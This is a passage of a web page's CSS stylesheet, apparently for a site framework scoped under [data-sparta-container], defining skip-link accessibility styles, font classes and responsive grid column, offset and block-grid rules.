            transition: top 1s ease-out 0s, background 1s linear 0s;
            z-index: 3333;
            text-align: center
        }

        [data-sparta-container] #ada-skip-link.ada-visible-focus:focus {
            clip: auto !important;
            background: #f9f7f4;
            box-shadow: 0px 0px 2px 0px rgba(51, 51, 51, 0.3);
            left: 0;
            top: 0;
            -webkit-transition: top 0.1s ease-in 0s, background 0.5s linear 0s;
            transition: top 0.1s ease-in 0s, background 0.5s linear 0s;
            color: #0052C2;
            opacity: 1
        }

        [data-sparta-container] a.skipoff {
            display: none
        }

        [data-sparta-container] .ada-hidden {
            clip: rect(1px, 1px, 1px, 1px) !important;
            overflow: hidden;
            width: 0;
            height: 0;
            opacity: 0;
            display: inline-block;
            position: absolute
        }

        [data-sparta-container] .h-100 {
            height: 100%
        }

        [data-sparta-container] .spa-oline:focus {
            outline: 1px dotted #333;
            text-decoration: none
        }

        [data-sparta-container] .plus-minus:before,
        [data-sparta-container] .plus-minus:after {
            content: "";
            width: 9px;
            height: 9px;
            position: absolute;
            top: 7.5;
            left: 0;
            border-bottom: 3px solid #666;
            margin-top: -7.5px
        }

        [data-sparta-container] .plus-minus:after {
            border-bottom: 0;
            border-left: 3px solid #666;
            margin: 0 -7.5px 0 7.5px;
            -webkit-transition: clip 0.3s linear;
            transition: clip 0.3s linear;
            clip: rect(0, 9px, 9px, 0)
        }

        [data-sparta-container] .plus-minus.minus:after {
            clip: rect(4.5px, 9px, 4.5, 0)
        }

        [data-sparta-container] [data-font] {
            visibility: hidden
        }

        [data-sparta-container] .cnx-bold,
        [data-sparta-container] [data-font="cnx-bold"] {
            font-family: "cnx-bold", Arial, Helvetica, sans-serif;
            font-weight: 700;
            visibility: visible
        }

        [data-sparta-container] .cnx-bold-italic,
        [data-sparta-container] [data-font="cnx-bold-italic"] {
            font-family: "cnx-bold-italic", Arial, Helvetica, sans-serif;
            font-weight: 700;
            visibility: visible
        }

        [data-sparta-container] .cnx-medium,
        [data-sparta-container] [data-font="cnx-medium"] {
            font-family: "cnx-medium", Arial, Helvetica, sans-serif;
            font-weight: 300;
            visibility: visible
        }

        [data-sparta-container] .cnx-medium-italic,
        [data-sparta-container] [data-font="cnx-medium-italic"] {
            font-family: "cnx-medium-italic", Arial, Helvetica, sans-serif;
            font-weight: 300;
            visibility: visible
        }

        [data-sparta-container] .cnx-light,
        [data-sparta-container] [data-font="cnx-light"] {
            font-family: "cnx-light", Arial, Helvetica, sans-serif;
            font-weight: 200;
            visibility: visible
        }

        [data-sparta-container] .cnx-light-italic,
        [data-sparta-container] [data-font="cnx-light-italic"] {
            font-family: "cnx-light-italic", Arial, Helvetica, sans-serif;
            font-weight: 200;
            visibility: visible
        }

        [data-sparta-container] .cnx-regular,
        [data-sparta-container] [data-font="cnx-regular"] {
            font-family: "cnx-regular", Arial, Helvetica, sans-serif;
            font-weight: 300;
            visibility: visible
        }

        [data-sparta-container] .cnx-regular strong,
        [data-sparta-container] .cnx-regular b,
        [data-sparta-container] [data-font="cnx-regular"] strong,
        [data-sparta-container] [data-font="cnx-regular"] b {
            font-family: "cnx-bold", Arial, Helvetica, sans-serif;
            font-weight: 700;
            visibility: visible
        }

        [data-sparta-container] .cnx-regular em,
        [data-sparta-container] .cnx-regular i,
        [data-sparta-container] [data-font="cnx-regular"] em,
        [data-sparta-container] [data-font="cnx-regular"] i {
            font-family: "cnx-italic", Arial, Helvetica, sans-serif;
            font-weight: 300;
            visibility: visible
        }

        [data-sparta-container] .cnx-cond-regular,
        [data-sparta-container] [data-font="cnx-cond-regular"] {
            font-family: "cnx-regular", Arial, Helvetica, sans-serif;
            font-weight: 300;
            visibility: visible;
            font-stretch: condensed
        }

        [data-sparta-container] .cnx-cond-regular strong,
        [data-sparta-container] .cnx-cond-regular b,
        [data-sparta-container] [data-font="cnx-cond-regular"] strong,
        [data-sparta-container] [data-font="cnx-cond-regular"] b {
            font-family: "cnx-bold", Arial, Helvetica, sans-serif;
            font-weight: 700;
            visibility: visible;
            font-stretch: condensed
        }

        [data-sparta-container] .cnx-cond-regular em,
        [data-sparta-container] .cnx-cond-regular i,
        [data-sparta-container] [data-font="cnx-cond-regular"] em,
        [data-sparta-container] [data-font="cnx-cond-regular"] i {
            font-family: "cnx-italic", Arial, Helvetica, sans-serif;
            font-weight: 300;
            visibility: visible;
            font-stretch: condensed
        }

        [data-sparta-container] .cnx-italic,
        [data-sparta-container] [data-font="cnx-italic"] {
            font-family: "cnx-italic", Arial, Helvetica, sans-serif;
            font-weight: 300;
            visibility: visible
        }

        [data-sparta-container] {
            width: 100%;
            min-height: 100%;
            background: #f9f7f4;
            margin: 0 auto
        }

        [data-sparta-container] .full-width-row.row,
        [data-sparta-container] .full-width-row>.row {
            width: 100% !important;
            max-width: 100% !important
        }

        [data-sparta-container] .row {
            width: 100%;
            max-width: 1296px !important;
            margin-left: auto;
            margin-right: auto
        }

        [data-sparta-container] .row:before,
        [data-sparta-container] .row:after {
            content: " ";
            display: table
        }

        [data-sparta-container] .row:after {
            clear: both
        }

        [data-sparta-container] .row>.small-12 {
            width: 100%
        }

        [data-sparta-container] .row>.small-11 {
            width: 91.66667%
        }

        [data-sparta-container] .row>.small-10 {
            width: 83.33333%
        }

        [data-sparta-container] .row>.small-9 {
            width: 75%
        }

        [data-sparta-container] .row>.small-8 {
            width: 66.66667%
        }

        [data-sparta-container] .row>.small-7 {
            width: 58.33333%
        }

        [data-sparta-container] .row>.small-6 {
            width: 50%
        }

        [data-sparta-container] .row>.small-5 {
            width: 41.66667%
        }

        [data-sparta-container] .row>.small-4 {
            width: 33.33333%
        }

        [data-sparta-container] .row>.small-3 {
            width: 25%
        }

        [data-sparta-container] .row>.small-2 {
            width: 16.66667%
        }

        [data-sparta-container] .row>.small-1 {
            width: 8.33333%
        }

        [data-sparta-container] .row>.small-offset-12 {
            margin-left: 100% !important
        }

        [data-sparta-container] .row>.small-offset-11 {
            margin-left: 91.66667% !important
        }

        [data-sparta-container] .row>.small-offset-10 {
            margin-left: 83.33333% !important
        }

        [data-sparta-container] .row>.small-offset-9 {
            margin-left: 75% !important
        }

        [data-sparta-container] .row>.small-offset-8 {
            margin-left: 66.66667% !important
        }

        [data-sparta-container] .row>.small-offset-7 {
            margin-left: 58.33333% !important
        }

        [data-sparta-container] .row>.small-offset-6 {
            margin-left: 50% !important
        }

        [data-sparta-container] .row>.small-offset-5 {
            margin-left: 41.66667% !important
        }

        [data-sparta-container] .row>.small-offset-4 {
            margin-left: 33.33333% !important
        }

        [data-sparta-container] .row>.small-offset-3 {
            margin-left: 25% !important
        }

        [data-sparta-container] .row>.small-offset-2 {
            margin-left: 16.66667% !important
        }

        [data-sparta-container] .row>.small-offset-1 {
            margin-left: 8.33333% !important
        }

        [data-sparta-container] .row>.small-offset-0 {
            margin-left: 0% !important
        }

        [data-sparta-container] .row>.small-push-12 {
            position: relative;
            left: 100%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-11 {
            position: relative;
            left: 91.66667%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-10 {
            position: relative;
            left: 83.33333%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-9 {
            position: relative;
            left: 75%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-8 {
            position: relative;
            left: 66.66667%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-7 {
            position: relative;
            left: 58.33333%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-6 {
            position: relative;
            left: 50%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-5 {
            position: relative;
            left: 41.66667%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-4 {
            position: relative;
            left: 33.33333%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-3 {
            position: relative;
            left: 25%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-2 {
            position: relative;
            left: 16.66667%;
            right: auto
        }

        [data-sparta-container] .row>.small-push-1 {
            position: relative;
            left: 8.33333%;
            right: auto
        }

        [data-sparta-container] .row>.small-pull-12 {
            position: relative;
            left: auto;
            right: 100%
        }

        [data-sparta-container] .row>.small-pull-11 {
            position: relative;
            left: auto;
            right: 91.66667%
        }

        [data-sparta-container] .row>.small-pull-10 {
            position: relative;
            left: auto;
            right: 83.33333%
        }

        [data-sparta-container] .row>.small-pull-9 {
            position: relative;
            left: auto;
            right: 75%
        }

        [data-sparta-container] .row>.small-pull-8 {
            position: relative;
            left: auto;
            right: 66.66667%
        }

        [data-sparta-container] .row>.small-pull-7 {
            position: relative;
            left: auto;
            right: 58.33333%
        }

        [data-sparta-container] .row>.small-pull-6 {
            position: relative;
            left: auto;
            right: 50%
        }

        [data-sparta-container] .row>.small-pull-5 {
            position: relative;
            left: auto;
            right: 41.66667%
        }

        [data-sparta-container] .row>.small-pull-4 {
            position: relative;
            left: auto;
            right: 33.33333%
        }

        [data-sparta-container] .row>.small-pull-3 {
            position: relative;
            left: auto;
            right: 25%
        }

        [data-sparta-container] .row>.small-pull-2 {
            position: relative;
            left: auto;
            right: 16.66667%
        }

        [data-sparta-container] .row>.small-pull-1 {
            position: relative;
            left: auto;
            right: 8.33333%
        }

        [data-sparta-container] .row>.small-reset-order {
            float: left;
            margin-left: 0;
            margin-right: 0;
            left: auto;
            right: auto
        }

        [data-sparta-container] .row .small-block-grid-12>li {
            width: 8.33333%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-12>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-12>li:nth-of-type(12n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-11>li {
            width: 9.09091%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-11>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-11>li:nth-of-type(11n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-10>li {
            width: 10%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-10>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-10>li:nth-of-type(10n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-9>li {
            width: 11.11111%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-9>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-9>li:nth-of-type(9n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-8>li {
            width: 12.5%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-8>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-8>li:nth-of-type(8n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-7>li {
            width: 14.28571%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-7>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-7>li:nth-of-type(7n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-6>li {
            width: 16.66667%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-6>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-6>li:nth-of-type(6n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-5>li {
            width: 20%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-5>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-5>li:nth-of-type(5n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-4>li {
            width: 25%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-4>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-4>li:nth-of-type(4n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-3>li {
            width: 33.33333%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-3>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-3>li:nth-of-type(3n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-2>li {
            width: 50%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-2>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-2>li:nth-of-type(2n+1) {
            clear: both
        }

        [data-sparta-container] .row .small-block-grid-1>li {
            width: 100%;
            list-style: none
        }

        [data-sparta-container] .row .small-block-grid-1>li:nth-of-type(1n) {
            clear: none
        }

        [data-sparta-container] .row .small-block-grid-1>li:nth-of-type(1n+1) {
            clear: both
        }

        [data-sparta-container] [class*="block-grid-"] {
            display: block;
            padding: 0;
            margin: 0 -5px
        }

        [data-sparta-container] [class*="block-grid-"]>li {
            display: block;
            float: left;
            height: auto;
            padding: 0 5px 10px;
            list-style: none
        }

        [data-sparta-container] .columns,
        [data-sparta-container] .column {
            position: relative;
            float: left;
            width: 100%
        }

        [data-sparta-container] .columns+.columns:last-child,
        [data-sparta-container] .columns+.column:last-child,
        [data-sparta-container] .column+.columns:last-child,
        [data-sparta-container] .column+.column:last-child {
            float: right
        }

        [data-sparta-container] .columns+.columns.end,
        [data-sparta-container] .columns+.column.end,
        [data-sparta-container] .column+.columns.end,
        [data-sparta-container] .column+.column.end {
            float: left
        }

        [data-sparta-container] .columns.small-centered,
        [data-sparta-container] .columns.centered,
        [data-sparta-container] .column.small-centered,
        [data-sparta-container] .column.centered {
            float: none;
            margin-left: auto;
            margin-right: auto
        }

        [data-sparta-container] .columns.small-centered:last-child,
        [data-sparta-container] .columns.centered:last-child,
        [data-sparta-container] .column.small-centered:last-child,
        [data-sparta-container] .column.centered:last-child {
            float: none
        }

        [data-sparta-container] .columns.small-uncentered,
        [data-sparta-container] .columns.uncentered,
        [data-sparta-container] .column.small-uncentered,
        [data-sparta-container] .column.uncentered {
            float: left;
            margin-left: 0;
            margin-right: 0
        }

        [data-sparta-container] .columns.small-uncentered:last-child,
        [data-sparta-container] .columns.uncentered:last-child,
        [data-sparta-container] .column.small-uncentered:last-child,
        [data-sparta-container] .column.uncentered:last-child {
            float: right
        }

        .small-up [data-sparta-container] .row {
            margin-left: auto;
            margin-right: auto;
            padding-left: 5px;
            padding-right: 5px
        }

        .small-up [data-sparta-container] .row.collapse,
        .small-up [data-sparta-container] .row.small-collapse,
        .small-up [data-sparta-container] .row.spa-collapse-small {
            width: 100%;
            margin-left: auto;
            margin-right: auto;
            padding-left: 0;
            padding-right: 0
        }

        .small-up [data-sparta-container] .row.collapse>.columns,
        .small-up [data-sparta-container] .row.collapse>.column,
        .small-up [data-sparta-container] .row.small-collapse>.columns,
        .small-up [data-sparta-container] .row.small-collapse>.column,
        .small-up [data-sparta-container] .row.spa-collapse-small>.columns,
        .small-up [data-sparta-container] .row.spa-collapse-small>.column {
            padding-left: 0;
            padding-right: 0
        }

        .small-up [data-sparta-container] .row.small-uncollapse,
        .small-up [data-sparta-container] .row.spa-uncollapse-small {
            width: 100%;
            padding-left: 0;
            padding-right: 0
        }

        .small-up [data-sparta-container] .row.small-uncollapse>.columns,
        .small-up [data-sparta-container] .row.small-uncollapse>.column,
        .small-up [data-sparta-container] .row.spa-uncollapse-small>.columns,
        .small-up [data-sparta-container] .row.spa-uncollapse-small>.column {
            padding-left: 5px;
            padding-right: 5px
        }

        .small-up [data-sparta-container] .row>.columns,
        .small-up [data-sparta-container] .row>.column {
            padding-left: 5px;
            padding-right: 5px
        }

        .medium-up [data-sparta-container] .row {
            margin-left: auto;
            margin-right: auto;
            padding-left: 7.5px;
            padding-right: 7.5px
        }

        .medium-up [data-sparta-container] .row.medium-collapse,
        .medium-up [data-sparta-container] .row.spa-collapse-medium {
            margin-left: 0;
            margin-right: 0;
            padding-left: 0;
            padding-right: 0
        }

        .medium-up [data-sparta-container] .row.medium-collapse>.columns,
        .medium-up [data-sparta-container] .row.medium-collapse>.column,
        .medium-up [data-sparta-container] .row.spa-collapse-medium>.columns,
        .medium-up [data-sparta-container] .row.spa-collapse-medium>.column {
            padding-left: 0;
            padding-right: 0
        }

        .medium-up [data-sparta-container] .row.medium-uncollapse,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium {
            padding-left: 7.5px;
            padding-right: 7.5px
        }

        .medium-up [data-sparta-container] .row.medium-uncollapse>.columns,
        .medium-up [data-sparta-container] .row.medium-uncollapse>.column,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.columns,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.column {
            padding-left: 7.5px;
            padding-right: 7.5px
        }

        .medium-up [data-sparta-container] .row.medium-uncollapse>.columns.medium-centered,
        .medium-up [data-sparta-container] .row.medium-uncollapse>.column.medium-centered,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.columns.medium-centered,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.column.medium-centered {
            float: none;
            margin-left: auto;
            margin-right: auto
        }

        .medium-up [data-sparta-container] .row.medium-uncollapse>.columns.medium-centered:last-child,
        .medium-up [data-sparta-container] .row.medium-uncollapse>.column.medium-centered:last-child,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.columns.medium-centered:last-child,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.column.medium-centered:last-child {
            float: none
        }

        .medium-up [data-sparta-container] .row.medium-uncollapse>.columns.medium-uncentered,
        .medium-up [data-sparta-container] .row.medium-uncollapse>.column.medium-uncentered,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.columns.medium-uncentered,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.column.medium-uncentered {
            float: left;
            margin-left: 0;
            margin-right: 0
        }

        .medium-up [data-sparta-container] .row.medium-uncollapse>.columns.medium-uncentered:last-child,
        .medium-up [data-sparta-container] .row.medium-uncollapse>.column.medium-uncentered:last-child,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.columns.medium-uncentered:last-child,
        .medium-up [data-sparta-container] .row.spa-uncollapse-medium>.column.medium-uncentered:last-child {
            float: right
        }

        .medium-up [data-sparta-container] .row>.medium-12 {
            width: 100%
        }

        .medium-up [data-sparta-container] .row>.medium-11 {
            width: 91.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-10 {
            width: 83.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-9 {
            width: 75%
        }

        .medium-up [data-sparta-container] .row>.medium-8 {
            width: 66.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-7 {
            width: 58.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-6 {
            width: 50%
        }

        .medium-up [data-sparta-container] .row>.medium-5 {
            width: 41.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-4 {
            width: 33.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-3 {
            width: 25%
        }

        .medium-up [data-sparta-container] .row>.medium-2 {
            width: 16.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-1 {
            width: 8.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-offset-12 {
            margin-left: 100% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-11 {
            margin-left: 91.66667% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-10 {
            margin-left: 83.33333% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-9 {
            margin-left: 75% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-8 {
            margin-left: 66.66667% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-7 {
            margin-left: 58.33333% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-6 {
            margin-left: 50% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-5 {
            margin-left: 41.66667% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-4 {
            margin-left: 33.33333% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-3 {
            margin-left: 25% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-2 {
            margin-left: 16.66667% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-1 {
            margin-left: 8.33333% !important
        }

        .medium-up [data-sparta-container] .row>.medium-offset-0 {
            margin-left: 0% !important
        }

        .medium-up [data-sparta-container] .row>.medium-push-12 {
            position: relative;
            left: 100%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-11 {
            position: relative;
            left: 91.66667%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-10 {
            position: relative;
            left: 83.33333%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-9 {
            position: relative;
            left: 75%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-8 {
            position: relative;
            left: 66.66667%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-7 {
            position: relative;
            left: 58.33333%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-6 {
            position: relative;
            left: 50%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-5 {
            position: relative;
            left: 41.66667%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-4 {
            position: relative;
            left: 33.33333%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-3 {
            position: relative;
            left: 25%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-2 {
            position: relative;
            left: 16.66667%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-push-1 {
            position: relative;
            left: 8.33333%;
            right: auto
        }

        .medium-up [data-sparta-container] .row>.medium-pull-12 {
            position: relative;
            left: auto;
            right: 100%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-11 {
            position: relative;
            left: auto;
            right: 91.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-10 {
            position: relative;
            left: auto;
            right: 83.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-9 {
            position: relative;
            left: auto;
            right: 75%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-8 {
            position: relative;
            left: auto;
            right: 66.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-7 {
            position: relative;
            left: auto;
            right: 58.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-6 {
            position: relative;
            left: auto;
            right: 50%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-5 {
            position: relative;
            left: auto;
            right: 41.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-4 {
            position: relative;
            left: auto;
            right: 33.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-3 {
            position: relative;
            left: auto;
            right: 25%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-2 {
            position: relative;
            left: auto;
            right: 16.66667%
        }

        .medium-up [data-sparta-container] .row>.medium-pull-1 {
            position: relative;
            left: auto;
            right: 8.33333%
        }

        .medium-up [data-sparta-container] .row>.medium-reset-order {
            float: left;
            margin-left: 0;
            margin-right: 0;
            left: auto;
            right: auto
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-12>li {
            width: 8.33333%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-12>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-12>li:nth-of-type(12n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-11>li {
            width: 9.09091%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-11>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-11>li:nth-of-type(11n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-10>li {
            width: 10%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-10>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-10>li:nth-of-type(10n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-9>li {
            width: 11.11111%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-9>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-9>li:nth-of-type(9n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-8>li {
            width: 12.5%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-8>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-8>li:nth-of-type(8n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-7>li {
            width: 14.28571%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-7>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-7>li:nth-of-type(7n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-6>li {
            width: 16.66667%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-6>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-6>li:nth-of-type(6n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-5>li {
            width: 20%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-5>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-5>li:nth-of-type(5n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-4>li {
            width: 25%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-4>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-4>li:nth-of-type(4n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-3>li {
            width: 33.33333%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-3>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-3>li:nth-of-type(3n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-2>li {
            width: 50%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-2>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-2>li:nth-of-type(2n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-1>li {
            width: 100%;
            list-style: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-1>li:nth-of-type(1n) {
            clear: none
        }

        .medium-up [data-sparta-container] .row .medium-block-grid-1>li:nth-of-type(1n+1) {
            clear: both
        }

        .medium-up [data-sparta-container] .row>.columns,
        .medium-up [data-sparta-container] .row>.column {
            padding-left: 7.5px;
            padding-right: 7.5px
        }

        .medium-up [data-sparta-container] .row>.columns.medium-centered,
        .medium-up [data-sparta-container] .row>.column.medium-centered {
            float: none;
            margin-left: auto;
            margin-right: auto
        }

        .medium-up [data-sparta-container] .row>.columns.medium-centered:last-child,
        .medium-up [data-sparta-container] .row>.column.medium-centered:last-child {
            float: none
        }

        .medium-up [data-sparta-container] .row>.columns.medium-uncentered,
        .medium-up [data-sparta-container] .row>.column.medium-uncentered {
            float: left;
            margin-left: 0;
            margin-right: 0
        }

        .medium-up [data-sparta-container] .row>.columns.medium-uncentered:last-child,
        .medium-up [data-sparta-container] .row>.column.medium-uncentered:last-child {
            float: right
        }

        .medium-up [data-sparta-container] [class*="block-grid-"] {
            display: block;
            padding: 0;
            margin: 0 -7.5px
        }

        .medium-up [data-sparta-container] [class*="block-grid-"]>li {
            display: block;
            float: left;
            height: auto;
            padding: 0 7.5px 15px;
            list-style: none
        }

        .large-up [data-sparta-container] .row {
            margin-left: auto;
            margin-right: auto;
            padding-left: 10px;
            padding-right: 10px
        }

        .large-up [data-sparta-container] .row.large-collapse,
        .large-up [data-sparta-container] .row.spa-collapse-large {
            margin-left: auto;
            margin-right: auto;
            padding-left: 0;
            padding-right: 0
        }

        .large-up [data-sparta-container] .row.large-collapse>.columns,
        .large-up [data-sparta-container] .row.large-collapse>.column,
        .large-up [data-sparta-container] .row.spa-collapse-large>.columns,
        .large-up [data-sparta-container] .row.spa-collapse-large>.column {
            padding-left: 0;
            padding-right: 0
        }

        .large-up [data-sparta-container] .row.large-uncollapse,
        .large-up [data-sparta-container] .row.spa-uncollapse-large {
            padding-left: 10px;
            padding-right: 10px
        }

        .large-up [data-sparta-container] .row.large-uncollapse>.columns,
        .large-up [data-sparta-container] .row.large-uncollapse>.column,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.columns,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.column {
            padding-left: 10px;
            padding-right: 10px
        }

        .large-up [data-sparta-container] .row.large-uncollapse>.columns.large-centered,
        .large-up [data-sparta-container] .row.large-uncollapse>.column.large-centered,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.columns.large-centered,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.column.large-centered {
            float: none;
            margin-left: auto;
            margin-right: auto
        }

        .large-up [data-sparta-container] .row.large-uncollapse>.columns.large-centered:last-child,
        .large-up [data-sparta-container] .row.large-uncollapse>.column.large-centered:last-child,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.columns.large-centered:last-child,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.column.large-centered:last-child {
            float: none
        }

        .large-up [data-sparta-container] .row.large-uncollapse>.columns.large-uncentered,
        .large-up [data-sparta-container] .row.large-uncollapse>.column.large-uncentered,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.columns.large-uncentered,
        .large-up [data-sparta-container] .row.spa-uncollapse-large>.column.large-uncentered {
            float: left;
            margin-left: 0;
            margin-right: 0
        }

        .large-up [data-sparta-container] .row.large-uncollapse>.columns.large-uncentered:last-child,
        .large-up [data-sparta-container] .row.large-uncollapse>.column.large-uncentered:last-child,
